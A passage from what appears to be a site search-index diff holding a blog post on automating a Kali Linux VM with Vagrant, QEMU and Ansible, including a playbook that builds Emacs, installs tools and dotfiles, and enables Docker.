Emacs 29.4 is installed command: emacs --version register: emacs_version ignore_errors: true changed_when: false - name: Clone Emacs repository git: repo: git://git.savannah.gnu.org/emacs.git dest: /tmp/emacs version: emacs-29.4 when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Run autogen shell: | cd /tmp/emacs ./autogen.sh when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Configure Emacs shell: | cd /tmp/emacs ./configure --with-native-compilation --with-json --with-tree-sitter --with-sqlite3 args: creates: /tmp/emacs/Makefile when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Build Emacs shell: | cd /tmp/emacs make -j$(nproc) args: creates: /tmp/emacs/src/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 1800 poll: 15 - name: Install Emacs become: yes shell: | cd /tmp/emacs make install args: creates: /usr/local/bin/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 900 poll: 15 - name: Install other base packages apt: name: - eza - alacritty - git - bat - seclists - ripgrep - fd-find state: present install_recommends: no - name: Setup dotfiles become_user: vagrant block: - name: Clone dotfiles git: repo: https://github.com/bloodstiller/kaliconfigs.git dest: \u0026#34;{{ user_home }}/.dotfiles\u0026#34; version: main # Or whatever branch you\u0026#39;re using update: yes # Ensures latest version is cloned clone: yes force: yes # This will overwrite local changes - name: Create required directories file: path: \u0026#34;{{ item }}\u0026#34; state: directory loop: - \u0026#34;{{ user_home }}/.doom.d\u0026#34; - \u0026#34;{{ user_home }}/.config\u0026#34; - name: Create symlinks file: src: \u0026#34;{{ item.src }}\u0026#34; dest: \u0026#34;{{ item.dest }}\u0026#34; state: link force: yes loop: - { src: \u0026#34;{{ user_home }}/.dotfiles/Zsh/.zshrc\u0026#34;, dest: \u0026#34;{{ user_home }}/.zshrc\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/config.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/config.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/init.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/init.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/packages.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/packages.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/README.org\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/README.org\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Starship/starship.toml\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/starship.toml\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Alacritty\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/Alacritty\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Tmux/.tmux.conf\u0026#34;, dest: \u0026#34;{{ user_home }}/.tmux.conf\u0026#34; } - name: Install Doom Emacs become_user: vagrant block: - name: Clone Doom Emacs git: repo: https://github.com/doomemacs/doomemacs dest: \u0026#34;{{ user_home }}/.config/emacs\u0026#34; depth: 1 - name: Install Doom Emacs # This is correct and the path is correct! shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom install --force\u0026#34; args: creates: \u0026#34;{{ user_home }}/.emacs.d/bin/doom\u0026#34; async: 900 poll: 15 - name: Update Doom recipe repositories shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom sync -u\u0026#34; async: 900 poll: 15 - name: Enable Docker service systemd: name: docker enabled: yes state: started - name: Add user to docker group user: name: vagrant groups: docker append: yes - name: Clean up apt: autoremove: yes clean: yes 3. Dotfiles and Tool Configuration The automation includes configuration for:\nAlacritty terminal emulator Tmux with custom keybindings Doom Emacs with security-focused packages Starship cross-shell prompt Zsh with Oh My Zsh Each tool has its own configuration module in the repository:\nAlacritty Configuration Tmux Configuration Doom Emacs Configuration Starship Configuration Zsh Configuration Included Tools \u0026amp; Features The automation sets up a comprehensive environment with:\nSecurity Tools SecLists (lots of lists) Kerbrute for Kerberos authentication testing Statistically Likely Usernames wordlist Common pentesting tools (I have my folders for linux \u0026amp; windows tools (I will make a repo for that soon)) Bloodhound for Active Directory analysis (dockerized) Development Environment Emacs 29.4 with native compilation Doom Emacs configuration This is my main editor and I use it for everything but if you prefer another editor you can change the Ansible playbook. Git version control Docker and Docker Compose Build tools and development libraries Modern Terminal Experience Alacritty terminal emulator Starship cross-shell prompt Tmuxinator for session management Command Line Improvements Eza (modern ls replacement) Bat (better cat) Ripgrep for searching fd-find for file discovery Enhanced Zsh configuration: zsh-autosuggestions zsh-syntax-highlighting zsh-autocomplete fast-syntax-highlighting Getting Started To use this automation:\nClone the repository:\ngit clone https://github.com/bloodstiller/kaliconfigs.git cd kaliconfigs Install prerequisites:\n# For Debian/Ubuntu sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients vagrant ansible # For Arch Linux sudo pacman -S qemu-full libvirt vagrant ansible Start the VM:\ncd Vagrant/QEMU vagrant up Development Workflow For efficient development and testing:\nRerun only Ansible playbooks:\nvagrant provision Run Ansible directly against the VM:\nvagrant ssh-config \u0026gt; vagrant-ssh-config ansible-playbook -i .vagrant/provisioners/ansible/inventory/vagrant_ansible_inventory Ansible/configure-kali.yml Use snapshots for safe testing:\nvagrant snapshot save baseline vagrant snapshot restore baseline Customization Options The automation is highly customizable:\nVM Resources (Vagrantfile):\nconfig.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 end Package Selection (Ansible):\n​ - name: Install base packages apt: name: ​ - eza ​ - alacritty ​ - git # Add your packages here Shared Folders:\nconfig.vm.synced_folder \u0026#34;/path/to/host\u0026#34;, \u0026#34;/path/in/guest\u0026#34;, type: \u0026#34;virtiofs\u0026#34; Documentation \u0026amp; Resources For detailed setup and configuration instructions, refer to:\nMain Project Documentation - Overview and quick start guide Ansible Configuration Guide - Detailed playbook customization QEMU/KVM Setup Guide - QEMU-specific installation and configuration Alacritty Configuration - Terminal emulator setup Doom Emacs Configuration - Editor configuration Tmux Configuration - Terminal multiplexer setup Starship Configuration - Shell prompt customization Zsh Configuration - Shell configuration and plugins Conclusion Automating Kali VM setup with QEMU and Ansible has significantly improved my workflow. The combination of Vagrant for VM management, QEMU for virtualization, and Ansible for configuration provides a powerful and flexible automation stack.\nThe complete code is available in my kaliconfigs repository . Feel free to fork it and adapt it to your needs.\nHappy hacking!\n", 
         "url": "\/\/uildDrafts:1313\/tools\/automatingqemukalivmansible\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/automation\/": {
-        "title": "Automation",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/automation\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/dotfiles\/": {
-        "title": "Dotfiles",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/dotfiles\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/kali\/": {
-        "title": "Kali",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/kali\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/qemu\/": {
-        "title": "Qemu",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/qemu\/"
     },
     
     "\/\/uildDrafts:1313\/walkthroughs\/redpanda-box\/": {
